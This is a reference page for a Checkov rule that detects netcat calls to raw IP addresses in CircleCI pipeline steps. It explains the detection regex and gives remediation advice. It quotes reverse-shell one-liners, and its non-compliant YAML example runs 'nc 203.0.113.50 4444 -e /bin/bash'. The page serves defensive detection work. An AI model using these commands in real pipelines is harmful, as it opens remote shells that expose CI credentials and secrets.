# CKV_CIRCLECIPIPELINES_5: Suspicious use of netcat with IP address

## Severity
**CRITICAL** (score: 9.3/10)

A netcat invocation against a raw IP address inside a CI run step is a classic reverse-shell/backdoor pattern, indicating the pipeline (which typically holds build credentials and secrets) may already be compromised or is being used to establish attacker-controlled remote access.

## Summary
This check flags any CircleCI `run` step whose command invokes `nc`/`netcat` directly against a literal IP address, a pattern strongly associated with reverse shells and data exfiltration rather than legitimate diagnostics.

## Applicability
Applies to CircleCI Pipeline configuration files (`.circleci/config.yml`), specifically every step under `jobs.*.steps[]` that is a `run` step (either the shorthand string form or the `run: {command: ...}` map form).

## Why it matters
`nc <ip> <port>` (or `netcat <ip> <port>`) piped to/from a shell is one of the most common one-liners used to establish a reverse shell (e.g. `nc -e /bin/sh <attacker-ip> <port>` or `bash -i >& /dev/tcp/<ip>/<port> 0>&1` variants using nc as a listener/pusher). Seeing this pattern inside a CI pipeline definition is a strong indicator of either: (1) a compromised pipeline configuration used to exfiltrate CI secrets/environment variables to an attacker-controlled host, (2) a malicious or careless contributor testing backdoor access, or (3) a supply-chain injection via a compromised orb or shared config fragment. Because CI runners typically have access to build secrets, cloud credentials, and internal network segments, an undetected reverse shell in a pipeline step can be a direct path to lateral movement and credential theft.

## How Checkov evaluates this
The check (`ReverseShellNetcat`) applies a regex, `(nc|netcat) (\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})`, against the text of each step's `run` command. For each step:
- If the step is not a dict, the result is `UNKNOWN`.
- If the step has no `run` key, it `PASSED`s trivially.
- If `run` is a map, the check extracts `run.command`; if `run` is a plain string, it uses that string directly.
- If the regex matches anywhere in that command text (i.e., the literal word `nc` or `netcat` followed by a space and what looks like four dot-separated numeric octets — note the regex uses `.` not `\.`, so it loosely matches any character as the separator), the step `FAILED`s.
- Otherwise it `PASSED`s.

## Non-compliant example
```yaml
version: 2.1

jobs:
  debug-network:
    docker:
      - image: cimg/base:current
    steps:
      - checkout
      - run:
          name: "Debug connectivity"
          command: |
            nc 203.0.113.50 4444 -e /bin/bash
```

## Remediated example
```yaml
version: 2.1

jobs:
  debug-network:
    docker:
      - image: cimg/base:current
    steps:
      - checkout
      - run:
          name: "Check service reachability"
          command: |
            curl -sSf --max-time 5 https://internal-service.example.com/healthz
```

## Remediation steps
1. Locate the flagged `run` step and determine why `nc`/`netcat` is being invoked against a raw IP address.
2. If it's leftover debugging code or a backdoor, remove it immediately and treat the pipeline/branch as potentially compromised — rotate any secrets that were exposed to that job.
3. If there is a legitimate need (e.g. port-connectivity testing), replace it with a safer, purpose-built tool (`curl`, `nmap -Pn -p <port> <host>` for connectivity checks, or a dedicated health-check endpoint) and avoid piping shells over the connection.
4. Restrict which contributors/orbs can modify `.circleci/config.yml`, and require review on config changes, since this file directly controls what commands run with CI credentials.
5. If the finding is a false positive (e.g. version-like strings after `nc` that aren't an IP), consider a Checkov suppression comment with justification, but confirm manually first — do not silence without verifying intent.

## References
- Checkov check source: https://github.com/bridgecrewio/checkov/blob/main/checkov/circleci_pipelines/checks/ReverseShellNetcat.py
